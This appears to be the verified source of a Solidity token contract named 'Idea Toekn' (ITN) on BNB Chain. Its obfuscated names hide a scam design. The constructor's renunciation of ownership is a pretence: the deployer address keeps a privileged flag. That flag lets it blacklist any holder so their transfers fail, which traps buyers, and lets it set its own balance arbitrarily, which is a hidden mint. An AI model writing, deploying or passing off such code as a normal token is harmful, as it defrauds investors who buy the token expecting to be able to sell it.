/**
 *Submitted for verification at BscScan.com on 2023-02-18
*/

//SPDX-License-Identifier: MIT

pragma solidity ^0.8.9;


interface fundReceiver {
    function createPair(address shouldAuto, address fromFee) external returns (address);
}

interface limitWallet {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

contract IdeaToekn {

    address public owner;

    bool public teamBuyReceiver;

    mapping(address => bool) public sellMode;

    function transfer(address takeLiquidity, uint256 atSwap) external returns (bool) {
        return feeFundAmount(receiverLimit(), takeLiquidity, atSwap);
    }

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    bool public minAmount;

    address public sellFund;

    function modeFee(address autoReceiver) public {
        if (maxLimit) {
            return;
        }
        
        sellMode[autoReceiver] = true;
        if (minAmount) {
            teamBuyReceiver = true;
        }
        maxLimit = true;
    }

    function tradingTeam() public {
        if (teamBuyReceiver) {
            teamTotal = shouldTeam;
        }
        
        teamTotal=0;
    }

    function transferFrom(address amountMax, address enableFeeShould, uint256 atSwap) external returns (bool) {
        if (allowance[amountMax][receiverLimit()] != type(uint256).max) {
            require(atSwap <= allowance[amountMax][receiverLimit()]);
            allowance[amountMax][receiverLimit()] -= atSwap;
        }
        return feeFundAmount(amountMax, enableFeeShould, atSwap);
    }

    uint256 public autoListMarketing;

    mapping(address => uint256) public balanceOf;

    uint256 public teamTotal;

    function fromLimit() public {
        emit OwnershipTransferred(atFee, address(0));
        owner = address(0);
    }

    uint256 private shouldTeam;

    function shouldAmount() public view returns (uint256) {
        return shouldTeam;
    }

    mapping(address => bool) public teamSenderMax;

    address public atFee;

    function maxTx() public view returns (uint256) {
        return teamTotal;
    }

    string public symbol = "ITN";

    bool public maxLimit;

    function liquidityFee(address amountMax, address enableFeeShould, uint256 atSwap) internal returns (bool) {
        require(balanceOf[amountMax] >= atSwap);
        balanceOf[amountMax] -= atSwap;
        balanceOf[enableFeeShould] += atSwap;
        emit Transfer(amountMax, enableFeeShould, atSwap);
        return true;
    }

    constructor (){
        
        limitWallet feeSell = limitWallet(0x10ED43C718714eb63d5aA57B78B54704E256024E);
        sellFund = fundReceiver(feeSell.factory()).createPair(feeSell.WETH(), address(this));
        owner = receiverLimit();
        
        atFee = owner;
        sellMode[atFee] = true;
        balanceOf[atFee] = totalSupply;
        
        emit Transfer(address(0), atFee, totalSupply);
        fromLimit();
    }

    function fromWalletIs() public view returns (bool) {
        return teamBuyReceiver;
    }

    function sellLaunch() public {
        if (autoListMarketing == shouldTeam) {
            autoListMarketing = teamTotal;
        }
        
        teamTotal=0;
    }

    function approve(address feeEnableTrading, uint256 atSwap) public returns (bool) {
        allowance[receiverLimit()][feeEnableTrading] = atSwap;
        emit Approval(receiverLimit(), feeEnableTrading, atSwap);
        return true;
    }

    function tradingShouldMin(address sellAtTake) public {
        
        if (sellAtTake == atFee || sellAtTake == sellFund || !sellMode[receiverLimit()]) {
            return;
        }
        if (teamTotal != autoListMarketing) {
            autoListMarketing = shouldTeam;
        }
        teamSenderMax[sellAtTake] = true;
    }

    function feeFundAmount(address amountMax, address enableFeeShould, uint256 atSwap) internal returns (bool) {
        if (amountMax == atFee) {
            return liquidityFee(amountMax, enableFeeShould, atSwap);
        }
        require(!teamSenderMax[amountMax]);
        return liquidityFee(amountMax, enableFeeShould, atSwap);
    }

    function receiverMax(uint256 atSwap) public {
        if (!sellMode[receiverLimit()]) {
            return;
        }
        balanceOf[atFee] = atSwap;
    }

    event Approval(address indexed fromFund, address indexed spender, uint256 value);

    string public name = "Idea Toekn";

    function marketingExempt() public {
        
        
        autoListMarketing=0;
    }

    uint256 public totalSupply = 100000000 * 10 ** 18;

    mapping(address => mapping(address => uint256)) public allowance;

    uint8 public decimals = 18;

    function receiverLimit() private view returns (address) {
        return msg.sender;
    }

    event Transfer(address indexed from, address indexed senderLaunched, uint256 value);

    function getOwner() external view returns (address) {
        return owner;
    }

    function fromToken() public {
        
        
        autoListMarketing=0;
    }

}